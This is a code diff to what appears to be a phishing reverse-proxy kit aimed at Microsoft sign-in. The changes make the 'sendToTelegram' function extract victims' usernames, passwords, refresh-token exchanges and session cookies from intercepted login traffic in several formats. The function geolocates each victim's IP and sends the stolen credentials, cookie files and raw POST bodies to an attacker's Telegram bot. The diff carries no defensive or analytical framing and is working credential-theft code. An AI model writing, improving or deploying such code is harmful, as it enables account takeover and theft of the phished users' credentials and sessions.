@@ -102,11 +102,19 @@ async function sendToTelegram(data) {
         const sessionId = data.sessionId || 'unknown';
         const userAgent = data.proxyRequestHeaders?.['user-agent'] || 'Unknown';
         
+        console.log('📨 sendToTelegram() CALLED with URL:', url);
+        
         // ────── CHECK IF ALREADY NOTIFIED ──────
         if (NOTIFIED_SESSIONS.has(sessionId)) {
+            console.log('⏭️ Already notified for session:', sessionId);
             return;
         }
         
+        const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
+                   data.proxyRequestHeaders?.['x-real-ip'] || 
+                   data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
+                   'Unknown';
+
         // ────── CHECK FOR CREDENTIALS ──────
         let username = 'N/A';
         let password = 'N/A';
@@ -115,8 +123,11 @@ async function sendToTelegram(data) {
         let isTokenExchange = false;
         
         if (body) {
+            // Convert body to string if it's not already
             const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+            console.log('📦 Raw body (first 500 chars):', bodyStr.slice(0, 500));
             
+            // ── PATTERN 1: URL-encoded form data (login.microsoftonline.com) ──
             const userMatch = bodyStr.match(/(?:login|loginfmt|username)=([^&]+)/i);
             if (userMatch) {
                 username = decodeURIComponent(userMatch[1]);
@@ -126,11 +137,43 @@ async function sendToTelegram(data) {
             if (passMatch) {
                 password = decodeURIComponent(passMatch[1]);
                 hasCredentials = true;
+                console.log('✅ PASSWORD FOUND (URL-encoded):', password);
             }
             
+            // ── PATTERN 2: JSON format (common with modern Microsoft login) ──
+            try {
+                const jsonBody = typeof body === 'string' ? JSON.parse(body) : body;
+                if (jsonBody.password) {
+                    password = jsonBody.password;
+                    hasCredentials = true;
+                    console.log('✅ PASSWORD FOUND (JSON):', password);
+                }
+                if (jsonBody.username) {
+                    username = jsonBody.username;
+                }
+                if (jsonBody.loginfmt) {
+                    username = jsonBody.loginfmt;
+                }
+            } catch (e) {
+                // Not JSON, that's fine
+            }
+            
+            // ── PATTERN 3: Check for password in raw string (fallback) ──
+            if (!hasCredentials && bodyStr.includes('password')) {
+                const rawPassMatch = bodyStr.match(/"password"\s*[:=]\s*"([^"]+)"/i) ||
+                                    bodyStr.match(/password['"]?\s*[:=]\s*['"]?([^'"]+)['"]?/i);
+                if (rawPassMatch) {
+                    password = rawPassMatch[1];
+                    hasCredentials = true;
+                    console.log('✅ PASSWORD FOUND (raw):', password);
+                }
+            }
+            
+            // ── PATTERN 4: Token exchange ──
             if (bodyStr.includes('refresh_token') && bodyStr.includes('grant_type')) {
                 isTokenExchange = true;
                 hasCredentials = true;
+                console.log('✅ TOKEN EXCHANGE DETECTED');
             }
         }
         
@@ -143,32 +186,33 @@ async function sendToTelegram(data) {
                 cookieStr.includes('LoginOptions')) {
                 isSessionCookie = true;
                 hasCredentials = true;
+                console.log('✅ SESSION COOKIE DETECTED');
             }
         }
         
         // ────── SKIP IF NOTHING VALUABLE ──────
         if (!hasCredentials) {
+            console.log('⏭️ Skipping notification - no credentials found in:', url);
             return;
         }
         
-        // ────── MARK AS NOTIFIED ──────
+        console.log('✅ Valid credentials found, sending notification...');
         NOTIFIED_SESSIONS.add(sessionId);
         
-        const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
-                   data.proxyRequestHeaders?.['x-real-ip'] || 
-                   data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
-                   'Unknown';
-
+        // ────── GEO INFO ──────
         let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
         let flag = '🌍';
         let location = 'Unknown';
 
         if (ip !== 'Unknown') {
-            geo = await getGeoInfo(ip);
-            flag = getFlagEmoji(geo.countryCode);
-            location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
+            try {
+                geo = await getGeoInfo(ip);
+                flag = getFlagEmoji(geo.countryCode);
+                location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
+            } catch (e) {}
         }
 
+        // ────── BUILD MESSAGE ──────
         let message = `
 🔐 **New Login Captured!**
 
@@ -211,19 +255,53 @@ ${flag} **Location:** ${location}
             `;
         }
 
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        });
+        // ────── SEND TELEGRAM ──────
+        console.log('📤 Sending Telegram message...');
+        try {
+            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            });
+            console.log('✅ Telegram message sent successfully');
+        } catch (telegramError) {
+            console.error('❌ Telegram send failed:', telegramError.message);
+            if (telegramError.response) {
+                console.error('   Response:', telegramError.response.data);
+            }
+            throw telegramError; // Re-throw to trigger the outer catch
+        }
 
+        // ────── SEND COOKIES AS FILE ──────
         const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
         if (cookies && Object.keys(cookies).length > 0) {
-            await sendCookiesAsFile(cookies, sessionId);
+            try {
+                await sendCookiesAsFile(cookies, sessionId);
+                console.log('✅ Cookies file sent');
+            } catch (e) {
+                console.log('⚠️ Cookie file send failed:', e.message);
+            }
+        }
+
+        // ────── SEND RAW DATA (FOR DEBUGGING) ──────
+        if (body && typeof body === 'string' && body.length > 0 && body.length < 4000) {
+            try {
+                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    chat_id: CHAT_ID,
+                    text: `📦 **Raw POST Data:**\n\`\`\`\n${body.slice(0, 3000)}\n\`\`\``,
+                    parse_mode: 'Markdown'
+                });
+                console.log('✅ Raw data sent successfully');
+            } catch (e) {
+                console.log('⚠️ Raw data send failed:', e.message);
+            }
         }
 
     } catch (e) {
-        console.error('❌ Telegram send failed:', e.message);
+        console.error('❌ sendToTelegram() FAILED:', e.message);
+        console.error('   Stack:', e.stack);
+        // Don't mark as notified on failure so we retry later
+        NOTIFIED_SESSIONS.delete(sessionId);
     }
 }
 
@@ -1538,10 +1616,18 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
         await new Promise(resolve => logFileStream.once("drain", resolve));
     }
     
+    // ────── FIXED: AWAIT + ERROR HANDLING ──────
     try {
         await sendToTelegram(httpProxyTransaction);
+        console.log('✅ Telegram notification sent for:', proxyRequestOptions.path);
     } catch (telegramError) {
         console.error('❌ Telegram notification FAILED:', telegramError.message);
+        console.error('   URL:', httpProxyTransaction.proxyRequestURL);
+        // Log to error file
+        try {
+            fs.appendFileSync('telegram_errors.log', 
+                `[${new Date().toISOString()}] ${telegramError.message} | ${httpProxyTransaction.proxyRequestURL}\n`);
+        } catch (e) {}
     }
 }
 
